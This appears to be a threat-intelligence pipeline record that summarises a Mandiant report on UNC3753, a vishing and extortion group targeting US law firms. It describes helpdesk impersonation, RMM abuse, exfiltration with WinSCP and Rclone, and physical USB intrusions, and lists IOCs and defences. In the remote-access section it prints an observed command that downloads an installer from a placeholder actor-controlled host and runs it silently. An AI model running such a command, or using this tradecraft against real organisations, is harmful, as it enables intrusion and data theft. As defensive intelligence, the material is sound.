---
raw_id: raw-2026-06-17-pm-003
collected_at: 2026-06-17T15:42:00-04:00
run_id: pre-brief-20260617-153000
collection_mode: pre_brief_collection
source:
  source_yaml_id: mandiant
  source_name: Mandiant / Google Threat Intelligence Group
  source_url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
  published_at: 2026-06-05T00:00:00-04:00
match_reason:
  watchlist: []
  actors: [UNC3753, Luna Moth, Chatty Spider, Silent Ransom Group, SRG, UNC2686]
  vulnerabilities: []
  keywords: [UNC3753, law firms, vishing, voice phishing, LOCKBIT.BLACK, physical intrusion, USB exfiltration, LEAKEDDATA, financial extortion]
triage_tags: [mandiant_full_body_retrieval, watch_item_resolved, new_actor_dossier_candidate, supply_chain_adjacent_a&d, physical_intrusion_tradecraft, professional_services_targeting]
iocs_extracted: true
iocs_count: 11
text_word_count: 3200
promoted: true
promoted_to_finding: finding-2026-06-17-0003
promoted_at: 2026-06-17T16:00:00-04:00
ttl_expires_at: 2026-09-15T15:42:00-04:00
---

# Seeking Counsel: Ongoing Targeted Campaign Against US Law Firms

Mandiant / Google Threat Intelligence Group, 2026-06-05.

Authors: Chad Reams, Tufail Ahmed, Keith Knapp, Ashley Frazer, Tyler McLellan.

## Executive Summary

From January through May 2026, Mandiant identified a financially motivated data theft extortion campaign executed by **UNC3753** targeting dozens of organizations across professional, legal, and financial services in the United States. The threat group leverages voice phishing (vishing) and social engineering to achieve remote access, with the entire attack sequence — from initial contact to data theft and extortion — often occurring within a single business day. Notably, suspected UNC3753 actors have also attempted physical office intrusions to exfiltrate data via USB media.

## Threat Actor Attribution

- **Primary identifier:** UNC3753
- **Aliases:** Luna Moth, Chatty Spider, Silent Ransom Group (SRG)
- **Classification:** Financially motivated threat cluster
- **Active since:** at least March 2022
- **TTP overlaps:** UNC2686 (conducted "Bazarcall"-style campaigns dating to early 2021)
- **Historical activity:**
  - Deployed LOCKBIT.BLACK in 2022
  - Shifted from subscription-themed billing email lures (with PDF attachments) to IT helpdesk impersonation beginning around March 2025
  - Now prioritizes data-theft-extortion-only operations with threats to post stolen files to LEAKEDDATA DLS

## Industries and victims

- US legal services firms (primary)
- Professional services
- Financial services

Rationale: legal entities maintain concentrated repositories of sensitive client transaction files, M&A plans, client trade secrets, and corporate regulatory reports — heavy reputational/regulatory exposure makes them motivated to resolve extortion quietly.

## Technical TTPs

### Initial access — phishing / vishing

1. Email lures (non-malicious): invoice-themed from actor-controlled consumer email; no active links/attachments. Generic text (e.g., "hello, here is the invcoie we talked about yesterday"). Purpose is to raise the target's internal security antennae so the follow-up voice call lands.

2. Targeted voice phishing: callers pose as internal IT helpdesk / security; pretexts include data migration projects and security issue remediation; goal is to direct targets to join screen-sharing sessions.

### Remote access

Screen-sharing utilities leveraged: Zoom, Microsoft Terminal Services, Microsoft Teams, Quick Assist. One observed incident: same actor held five distinct calls with same target over a three-day period via Teams.

Commercial RMM agents deployed: AnyDesk, Bomgar, Zoho Assist, SuperOps RMM (attempted installation via cURL command).

Delivery mechanism: Privnote (`privnote[.]com`) — web-based self-destructing text utility used to transmit installation links/commands. Evasion benefit: copy-paste vectors leave no permanent footprint.

Example cURL command observed:
```
curl -sL "http://[actor-controlled-ip]/installer" -o "SuperOps.msi" && msiexec /i "SuperOps.msi" /quiet
```

### Infrastructure pivoting

- BYOD exploitation: compromised personal laptops to establish Zoom sessions, access internal enterprise assets through BYOD remote environments.
- VDI access: leveraged native client platforms from compromised BYOD devices — Windows 365 (Windows365.exe), Citrix clients.
- File system pivot: enumerate local directories + active OneDrive folders + mapped network drives; target document-management repositories; keyword search (particularly iManage) for tax logs (W-2/W-9/1099), audit files, corporate client agreements, SSNs.

### Data staging & exfiltration

- Staging: compile/sort within target-accessible subdirectories (Downloads, Roaming profile path).
- Cloud staging: drag-and-drop into actor-controlled consumer file-sharing accounts; folders renamed to mimic victim org branding.
- FTP/SFTP: Portable WinSCP, Rclone. Example: 1.7GB exfiltrated from local OneDrive → Google Drive account; then pivoted to VDI session and exfiltrated additional 14.4GB via WinSCP. Google response: disabled associated Drive accounts/assets.
- Email forwarding: staged from internal iManage repositories; instructed victims to send files to actor-controlled consumer emails from target's mailbox.

### Physical intrusions

Individuals posing as IT technicians entered corporate offices; claimed need to image device or create local backups to address security issues; attempted direct exfiltration via USB storage. GTIG assessment: limited forensic evidence and absence of subsequent extortion attempts prevent formal attribution; however, physical intrusions "likely associated with UNC3753 based on structural, timeline, and targeting overlaps."

## Extortion operations

- Communications via email shortly after data theft, typically within 30 minutes of exiting target environment.
- Deadline: three-day response window.
- Escalation threats: direct calls/emails to employees, contacting external clients, publishing on LEAKEDDATA DLS.
- Sample subject line: `[Victim Name] has lost confidential data of their clients. Very Important!`

## IOCs

### IPv4
```
192.236.147.131
192.236.147.138
193.141.60.212
192.236.154.158
192.236.146.173
174.169.162.62
64.94.84.97
```

### Data leak site
```
hxxps[:]//business-data-leaks[.]com
```

### Phishing naming convention
```
<organization>-itdesk[.]com
<organization>-it[.]com
<organization>-helpdesk[.]com
```

### VirusTotal GTI Collection
SHA-256: `598281d2c6de83adf1505ee6077608d0c043623d477e2884d36d65e90686d67a`

## MITRE ATT&CK mapping (abbreviated)

T1566.004 (Spearphishing Voice), T1133, T1204.002, T1059.001/.003, T1569.002, T1053.005, T1547.001, T1036.005, T1553.002, T1562.001, T1070.001, T1003.001/.002, T1083, T1135, T1046, T1219, T1021.001, T1021.004, T1005, T1572, T1020, T1567.002, T1052.001, T1486.

## Defense recommendations (summarized)

- User awareness training on UNC3753-specific TTPs
- Physical access verification: official credentials/photo ID logged at front desk; verify visiting technicians against pre-scheduled work orders with parent organization/dispatcher; corporate-supervisor escort
- Remote access conditional access: restrict VDI/VPN to corporate-owned devices
- Strict RMM controls: block unauthorized RMM/screen-share utilities (Windows Defender Application Control, third-party endpoint protection)
- Endpoint USB hardening: disable read/write on external USB mass storage; GPO/MDM enforcement
- Network monitoring: block/alert on outbound file-sharing API/email; full session logging with bytes transferred; monitor SSH (port 22) from internal VDIs/endpoints for high-volume WinSCP/Rclone
- Application/log auditing: iManage / SharePoint / corporate email — real-time alerts on rapid file searches, search-term spikes, mass file downloads; MFA on business-critical repositories; BYOD MFA step-up at VDI entry

## Google SecOps detection rules

"Mandiant Intel Emerging Threats" rule pack: "Execute MSI Files Downloaded via Curl", "Suspected Rclone Exfiltration."

---

## Extraction notes

- Language: en
- Publisher byline: Mandiant / GTIG joint, 5 named co-authors
- Article type: detailed Mandiant cluster report
- Watch item context: This is the body retrieval for finding-2026-06-17-0003 (Mandiant title-snapshot from morning brief). Title-snapshot is now fully substantiated.
- Roster check: UNC3753 / Luna Moth / Chatty Spider / Silent Ransom Group is NOT on the 24-actor _roster.yaml roster. Possible new-actor dossier candidate operator-deferred per Hard Rule 5.
- A&D-relevance: Legal services targeting is A&D-supply-chain-adjacent via ITAR / export-control / IP-litigation counsel pathway. UNC3753 victims include "professional, legal, and financial services" — Mandiant does NOT name A&D-prime victims. Vishing tradecraft + RMM abuse + physical intrusion model is highly portable to A&D-prime infrastructure where outside counsel relationships exist.
- Defensive relevance high: BYOD/VDI + RMM-control + physical visitor verification are all A&D-prime-applicable defensive recommendations.
- Raw IOC extraction invoked: yes

## IOCs (from ioc-extraction skill)

```yaml
extracted_iocs:
  ipv4:
    - 192.236.147.131
    - 192.236.147.138
    - 193.141.60.212
    - 192.236.154.158
    - 192.236.146.173
    - 174.169.162.62
    - 64.94.84.97
  ipv6: []
  domains:
    - business-data-leaks.com
    - "<organization>-itdesk.com (template pattern)"
    - "<organization>-it.com (template pattern)"
    - "<organization>-helpdesk.com (template pattern)"
  urls:
    - "hxxps://business-data-leaks[.]com"
  hashes:
    sha256:
      - 598281d2c6de83adf1505ee6077608d0c043623d477e2884d36d65e90686d67a
  email_addresses: []
  attribution_claims:
    - actor: UNC3753
      aliases: [Luna Moth, Chatty Spider, Silent Ransom Group, SRG]
      confidence: Mandiant primary IR-vendor on attribution; high-confidence (5-named-author byline)
      source: Mandiant / GTIG
      classification: financially motivated
      ttp_overlap_clusters: [UNC2686]
      hard_rule_2_note: "UNC3753 not on Archimedes _roster.yaml. Mandiant primary attribution preserved verbatim. Operator-deferred /new-actor candidacy."
    - tradecraft_observations:
        - "Voice phishing (vishing) as initial access vector"
        - "Physical office intrusions to extract data via USB"
        - "RMM agent deployment (AnyDesk / Bomgar / Zoho Assist / SuperOps RMM)"
        - "BYOD/VDI pivot pattern (Zoom + Windows 365 + Citrix)"
        - "iManage / SharePoint / OneDrive keyword search exfiltration"
        - "Same-day attack → extortion timeline"
        - "Three-day extortion response window"
        - "LEAKEDDATA / business-data-leaks[.]com DLS"
```
